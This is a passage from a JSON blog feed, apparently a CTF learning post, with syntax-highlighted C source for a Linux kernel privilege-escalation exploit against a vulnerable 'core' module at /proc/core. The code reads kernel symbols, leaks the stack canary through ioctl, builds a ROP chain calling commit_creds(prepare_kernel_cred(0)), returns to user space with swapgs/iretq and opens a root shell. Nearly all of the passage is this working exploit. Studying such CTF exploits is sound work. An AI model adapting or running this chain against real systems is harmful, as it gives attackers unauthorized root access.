class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CORE_READ 0x6677889B</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CORE_OFF 0x6677889C</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> CORE_COPY 0x6677889A</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">size_t</span> vmlinux_base, commit_creds, prepare_kernel_cred;</span><br><span class=\"line\"><span class=\"type\">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class=\"line\"><span class=\"type\">size_t</span> raw_vmlinux_base = <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">GetAddress</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> <span class=\"type\">char</span> *ptr;</span><br><span class=\"line\"> <span class=\"type\">char</span> buf[<span class=\"number\">0x30</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"> FILE* fd = fopen(<span class=\"string\">&quot;/tmp/kallsyms&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!fd) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] ERROR.&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">while</span>(fgets(buf, <span class=\"keyword\">sizeof</span>(buf), fd)) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (commit_creds &amp;&amp; prepare_kernel_cred)&#123;</span><br><span class=\"line\">   <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Find: commit_creds: 0x%llx\\n[+] Find: prepare_kernel_cred: 0x%llx\\n&quot;</span>, commit_creds, prepare_kernel_cred);</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(buf, <span class=\"string\">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class=\"line\">   commit_creds = strtoull(buf, ptr, <span class=\"number\">16</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(buf, <span class=\"string\">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class=\"line\">   prepare_kernel_cred = strtoull(buf, ptr, <span class=\"number\">16</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">SaveStatus</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> __asm__(</span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_cs, cs;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_ss, ss;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;mov user_sp, rsp;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">  <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\"> );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">GetShell</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!getuid()) &#123;</span><br><span class=\"line\">  system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] CAN NOT GETSHELL.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> rop[<span class=\"number\">0x100</span>];</span><br><span class=\"line\"> <span class=\"type\">char</span> user_buf[<span class=\"number\">0x40</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"> <span class=\"type\">char</span>* ptr;</span><br><span class=\"line\"> <span class=\"type\">int</span> i = <span class=\"number\">8</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"> SaveStatus();</span><br><span class=\"line\"> GetAddress();</span><br><span class=\"line\"> vmlinux_base = commit_creds - <span class=\"number\">0x9c8e0</span>;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> pop_rdi = <span class=\"number\">0xffffffff81679ba8</span> + offset;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> pop_rdx = <span class=\"number\">0xffffffff810a0f49</span> + offset;</span><br><span class=\"line\"> <span class=\"type\">size_t</span> mov_rdi_rax = <span class=\"number\">0xffffffff8106a6d2</span> + offset; <span class=\"comment\">// mov rdi, rax; jmp rdx;</span></span><br><span class=\"line\"> <span class=\"type\">size_t</span> swapgs = <span class=\"number\">0xffffffff81a012da</span> + offset;  <span class=\"comment\">// swapgs; popfq; ret;</span></span><br><span class=\"line\"> <span class=\"type\">size_t</span> iretq = <span class=\"number\">0xffffffff81050ac2</span> + offset;   <span class=\"comment\">// iretq; ret;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"type\">int</span> fd = open(<span class=\"string\">&quot;/proc/core&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!fd) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;[-] OPEN /proc/core ERROR.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> ioctl(fd, CORE_OFF, <span class=\"number\">0x40</span>);\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"> ioctl(fd, <span class=\"number\">0x6677889B</span>, user_buf); <span class=\"comment\">//canary in buf.</span></span><br><span class=\"line\"> <span class=\"type\">size_t</span> canary = ((<span class=\"type\">size_t</span>*)user_buf)[<span class=\"number\">0</span>];</span><br><span class=\"line\"> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[+] Find canary: 0x%llx\\n&quot;</span>, canary);</span><br><span class=\"line\"> </span><br><span class=\"line\"> <span class=\"comment\">//commit_creads(prepare_kernel_cred(0));</span></span><br><span class=\"line\"> rop[i++] = canary;</span><br><span class=\"line\"> rop[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\"> rop[i++] = pop_rdi;</span><br><span class=\"line\"> rop[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\"> rop[i++] = prepare_kernel_cred;</span><br><span class=\"line\"> rop[i++] = pop_rdx;</span><br><span class=\"line\"> rop[i++] = commit_creds;</span><br><span class=\"line\"> rop[i++] = mov_rdi_rax;</span><br><span class=\"line\"> <span class=\"comment\">//swapgs --&gt; iretq: rip, cs, rflags, rsp, ss. GetShell</span></span><br><span class=\"line\"> rop[i++] = swapgs;</span><br><span class=\"line\"> rop[i++] = <span class=\"number\">0</span>;</span><br><span class=\"line\"> rop[i++] = iretq;</span><br><span class=\"line\"> rop[i++] = (<span class=\"type\">size_t</span>)GetShell;</span><br><span class=\"line\"> rop[i++] = user_cs;</span><br><span class=\"line\"> rop[i++] = user_rflags;</span><br><span class=\"line\"> rop[i++] = user_sp;</span><br><span class=\"line\"> rop[i++] = user_ss;</span><br><span class=\"line\"> </span><br><span class=\"line\"> write(fd, rop, <span class=\"keyword\">sizeof</span>(rop));</span><br><span class=\"line\">    ioctl(fd, CORE_COPY, <span class=\"number\">0xffffffffffff0000</span>|<span class=\"number\">0x100</span>);</span><br><span class=\"line\">    <span class=\"comment\">//传入一个负数，因为会被转为16位（2bytes）无符号数，最后的调用为 qmemcpy(v2, &amp;name, 0x100);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"如何上穿exp\"><a class=\"markdownIt-Anchor\" href=\"#如何上穿exp\">#</a> 如何上穿 exp。？</h2>\n",
            "tags": [
                "learning"
            ]
        }
    ]
}